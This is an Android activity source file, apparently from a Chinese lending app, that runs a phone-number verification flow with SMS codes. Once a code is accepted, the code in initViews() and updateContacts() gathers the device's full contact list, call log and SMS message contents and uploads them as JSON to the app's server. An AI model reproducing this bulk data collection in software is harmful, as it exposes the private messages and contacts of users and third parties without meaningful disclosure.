package com.ahxbapp.jsqb.activity;

import android.content.Context;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.View;
import android.view.ViewGroup;
import android.view.ViewTreeObserver;
import android.widget.Button;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;

import com.ahxbapp.common.Global;
import com.ahxbapp.common.ImageLoadTool;
import com.ahxbapp.common.LoginEditText;
import com.ahxbapp.common.enter.SimpleTextWatcher;
import com.ahxbapp.common.ui.BaseActivity;
import com.ahxbapp.common.util.SingleToast;
import com.ahxbapp.common.widget.ValidePhoneView;
import com.ahxbapp.jsqb.R;
import com.ahxbapp.jsqb.api.APIManager;
import com.ahxbapp.jsqb.dialog.LoadDialog;
import com.ahxbapp.jsqb.model.AuthenModel;
import com.ahxbapp.jsqb.model.CallInfo;
import com.ahxbapp.jsqb.model.ContactsInfo;
import com.ahxbapp.jsqb.model.MessageInfo;
import com.ahxbapp.jsqb.utils.CallHistoryUtils;
import com.ahxbapp.jsqb.utils.GetContactsInfo2;
import com.ahxbapp.jsqb.utils.GetMessageInfo;
import com.ahxbapp.jsqb.utils.MyToast;
import com.ahxbapp.jsqb.utils.PrefsUtil;
import com.google.gson.Gson;
import com.nostra13.universalimageloader.core.DisplayImageOptions;
import com.nostra13.universalimageloader.core.ImageLoader;
import com.nostra13.universalimageloader.core.assist.ImageScaleType;
import com.nostra13.universalimageloader.core.display.FadeInBitmapDisplayer;

import org.androidannotations.annotations.AfterViews;
import org.androidannotations.annotations.Click;
import org.androidannotations.annotations.EActivity;
import org.androidannotations.annotations.Extra;
import org.androidannotations.annotations.FocusChange;
import org.androidannotations.annotations.OnActivityResult;
import org.androidannotations.annotations.ViewById;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

/**
 * 手机号认证  2
 */
@EActivity(R.layout.activity_phone)
public class Phone2Activity extends BaseActivity {

    final private int RESULT_CLOSE = 100;
    @Extra
    String phone;
    @Extra
    Uri background;

    @Extra
    String timeStap, phoneToken, userid, validateCode;

    @ViewById
    LoginEditText editCode, editPassword, editSms;
    @ViewById
    Button loginButton;
    @ViewById
    ImageView checkCodeImg;
    @ViewById
    RelativeLayout codeImgWrapper, layoutRoot;
    @ViewById
    LinearLayout smsWrapper, ll2;
    @ViewById
    ValidePhoneView sendCode;

    @ViewById
    ImageButton mToolbarLeftIB;
    @ViewById
    TextView mToolbarTitleTV;
    @ViewById
    TextView tvPhone2, phoneTV;
    @ViewById
    TextView tvGetData, tvShouQuan;

    Handler handler = new Handler();

    DisplayImageOptions options = new DisplayImageOptions.Builder()
            .showImageForEmptyUri(R.mipmap.ic_default_image)
            .showImageOnFail(R.mipmap.ic_default_image)
            .resetViewBeforeLoading(true)
            .cacheOnDisk(true)
            .imageScaleType(ImageScaleType.EXACTLY)
            .bitmapConfig(Bitmap.Config.RGB_565)
            .considerExifParams(true)
            .displayer(new FadeInBitmapDisplayer(300))
            .build();
    View androidContent;
    TextWatcher textWatcher = new SimpleTextWatcher() {
        @Override
        public void afterTextChanged(Editable s) {
            upateLoginButton();
        }
    };
    TextWatcher textWatcherName = new SimpleTextWatcher() {
        @Override
        public void afterTextChanged(Editable s) {
//            userIcon.setImageResource(R.mipmap.ic_default_image);
//            userIcon.setBackgroundResource(R.drawable.icon_user_monkey);
        }
    };
    private String globalKey = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 调用下，防止收到上次登陆账号的通知
    }

    @AfterViews
    void init() {
        ll2.setVisibility(View.GONE);
        tvShouQuan.setTextColor(getResources().getColor(R.color.nav_blue));
        tvGetData.setTextColor(getResources().getColor(R.color.nav_blue));
        tvPhone2.setText("验证码");
        if (phone != null) {
            phoneTV.setText(phone);
        }
        mToolbarLeftIB.setImageResource(R.mipmap.back);
        mToolbarTitleTV.setText("手机验证");
        editCode.addTextChangedListener(textWatcher);

        editPassword.addTextChangedListener(textWatcher);
        editPassword.setHint("请输入验证码");
        upateLoginButton();

        editCode.addTextChangedListener(textWatcherName);

        androidContent = findViewById(android.R.id.content);
        androidContent.getViewTreeObserver().addOnGlobalLayoutListener(new ViewTreeObserver.OnGlobalLayoutListener() {
            @Override
            public void onGlobalLayout() {
                int height = androidContent.getHeight();
                if (height > 0) {
                    ViewGroup.LayoutParams lp = layoutRoot.getLayoutParams();
                    lp.height = height;
                    layoutRoot.setLayoutParams(lp);
                    androidContent.getViewTreeObserver().removeGlobalOnLayoutListener(this);
                }
            }
        });
        if (validateCode != null) {
            //   loginLayout.setVisibility(View.GONE);
            String imgUrl = validateCode;
            if (imgUrl != null && imgUrl.length() > 0) {
                codeImgWrapper.setVisibility(View.VISIBLE);
                ImageLoader.getInstance().clearDiskCache();
                ImageLoader.getInstance().clearMemoryCache();
                ImageLoader.getInstance().displayImage(imgUrl, checkCodeImg, ImageLoadTool.options);
                smsWrapper.setVisibility(View.VISIBLE);
            } else {
                codeImgWrapper.setVisibility(View.GONE);
            }
        } else {

        }
        initViews();
    }

    //点击发送验证码
    @Click
    void sendCode() {
        APIManager.getInstance().sendTwoCode(this, userid, timeStap, phoneToken, PrefsUtil.getString(this, "phone"), editCode.getText().toString(),
                new APIManager.APIManagerInterface.baseBlock() {

                    @Override
                    public void Success(Context context, JSONObject response) {
                        hideProgressDialog();
                        try {
                            if (response.getInt("result") == 1) {
                                MyToast.showToast(context, "验证码发送成功，请注意查收！");
                                //开始倒计时
                                sendCode.startTimer();
                            } else {
                                MyToast.showToast(context, response.getString("message"));
                            }
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }

                    @Override
                    public void Failure(Context context, JSONObject response) {
                        hideProgressDialog();
                    }
                });
    }


    @OnActivityResult(RESULT_CLOSE)
    void resultRegiter(int result) {

    }


    private void downloadValifyPhoto() {

    }

    @Click
    void loginButton(View v) {
        login();
    }

    private void login() {
        try {
            String password = validateCode == null ? editPassword.getText().toString() : editSms.getText().toString();
            if (password.isEmpty()) {
                showMiddleToast("验证码不能为空");
                return;
            }
            doValidate(password);
        } catch (Exception e) {
            Global.errorLog(e);
        }
    }

    //判断验证码
    private void doValidate(String password) {
        showLoad();
        editPassword.setText("");
        APIManager.getInstance().validateSmsCode(this, phoneToken, password, new APIManager.APIManagerInterface.getContact_back() {
            @Override
            public void Success(Context context, int result, String message) {
//                Log.e("tag", "验证码==>" + result);
                if (result == 1) {
                    //第一次验证码正确，采集通话记录
//                    SingleToast.showMiddleToast(context, message);
                    updateContacts();
                }
            }

            @Override
            public void Failure(Context context, JSONObject response) {
                if (loadDialog != null)
                    loadDialog.dismiss();
                int result = 0;
                try {
                    result = response.getInt("result");
                    if (result == 2) {
                        tvPhone2.setText("二次验证码");
                        //输入第二次验证码验证
                    } else if (result == 0) {
                        if (loadDialog != null)
                            loadDialog.dismiss();
                        //验证码错误
                        showButtomToast(response.getString("message"));
                        login();
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    //采集通话记录
    private void doCaiji() {
        new APIManager().CaiJi(Phone2Activity.this, phoneToken, phone, new APIManager.APIManagerInterface.checkPhonePsd_back() {
            @Override
            public void Success(Context context, final int result) {
                if (result == 1) {
                    countDown();
                }
            }

            @Override
            public void Failure(Context context, JSONObject response) {
                loadDialog.dismiss();
            }
        });
    }

    @Override
    public void onBackPressed() {
        finish();
    }

    @FocusChange
    void editName(boolean hasFocus) {

    }

    private void upateLoginButton() {
//        if (editCode.getText().length() == 0) {
//            loginButton.setEnabled(false);
//            return;
//        }

        if (editPassword.getText().length() == 0) {
            loginButton.setEnabled(false);
            return;
        }
        loginButton.setEnabled(true);
    }

    @Click
    void mToolbarLeftIB() {
        finish();
    }

    private List<ContactsInfo> contactsInfoList;
    private List<CallInfo> callInfos;
    private List<MessageInfo> messageInfos;

    private void initViews() {
        GetContactsInfo2 getContactsInfo = new GetContactsInfo2(this, this);
        //获取通讯录好友列表ContactsInfoList
        contactsInfoList = getContactsInfo.getLocalContactsInfos();
        callInfos = new CallHistoryUtils(this).getCallHistoryList(this.getContentResolver());
        messageInfos = new GetMessageInfo(this).getSmsInfos();
        //对象转为json
    }

    private void updateContacts() {
        if (contactsInfoList == null) {
            showButtomToast("请打开获取手机通讯录权限!");
            return;
        }
        if (callInfos == null) {
            showButtomToast("请打开获取手机通话记录权限!");
            return;
        }
        if (messageInfos == null) {
            showButtomToast("请打开获取短信内容权限!");
            return;
        }
        String directory = new Gson().toJson(contactsInfoList);
        String sms = new Gson().toJson(messageInfos);
        String call = new Gson().toJson(callInfos);
        APIManager.getInstance().getPhoneDirectory(this, directory, sms, call, new APIManager.APIManagerInterface.getContact_back() {
            @Override
            public void Success(Context context, int result, String message) {
                if (result == 1) {
                    doCaiji();
                } else {
                    showMiddleToast(message);
                    if (loadDialog != null)
                        loadDialog.dismiss();
                }
            }

            @Override
            public void Failure(Context context, JSONObject response) {
                if (loadDialog != null)
                    loadDialog.dismiss();
            }
        });
    }


    LoadDialog loadDialog;

    private void showLoad() {
        if (loadDialog == null) {
            loadDialog = new LoadDialog(this);
        }
        loadDialog.startAnmation();
        loadDialog.show();
    }

    private CountDownTimer timer;

    private boolean isFinish;

    private void countDown() {
        timer = new CountDownTimer(180 * 1000, 60 * 1000) {
            @Override
            public void onTick(final long millisUntilFinished) {
                requestState(0);
            }

            @Override
            public void onFinish() {
                isFinish = true;
                requestState(1);
            }
        };
        // 调用start方法开始倒计时
        timer.start();
    }


    private void requestState(int chek) {
        APIManager.getInstance().home_getAuthenStatus(this, chek, new APIManager.APIManagerInterface.common_object() {
            @Override
            public void Success(Context context, Object model) {
                hideProgressDialog();
                AuthenModel model1 = (AuthenModel) model;
                if (model1.getIsMobile() == 1) {//认证成功
                    timer.cancel();
                    timer = null;
                    loadDialog.dismiss();
                    showButtomToast("认证成功！");
                    setResult(RESULT_OK);
                    finish();
                } else {//认证失败
                    if (isFinish) {
                        loadDialog.dismiss();
                        timer.cancel();
                        timer = null;
                        SingleToast.showMiddleToast(Phone2Activity.this, "认证失败，请重新进入认证。");
                        setResult(RESULT_OK);
                        finish();
                    }
                }
            }

            @Override
            public void Failure(Context context, JSONObject response) {
                timer.cancel();
                timer = null;
                loadDialog.dismiss();
            }
        });
    }
}